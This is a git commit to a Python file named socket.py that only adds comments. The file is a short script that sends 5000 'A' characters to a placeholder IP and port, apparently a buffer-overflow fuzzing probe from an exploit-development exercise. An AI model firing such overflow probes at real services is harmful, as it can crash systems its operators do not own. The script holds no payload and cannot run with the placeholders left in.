dc3f5f807167efa5114caea7e2c2b87f8b68e005
Uriel Ricardo <winchesteruriel@gmail.com>
2017-02-01 19:46:53 -0200

    Update socket.py

--- socket.py
+++ socket.py
@@ -1,10 +1,12 @@
 #!/usr/bin/python
-import socket
+import socket #Importing the socket library
 
 buffer =  'A' * 5000
 
+#connecting
 s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 s.connect(("IP", PORT))
 
+#sending
 s.send(buffer)
 s.close()
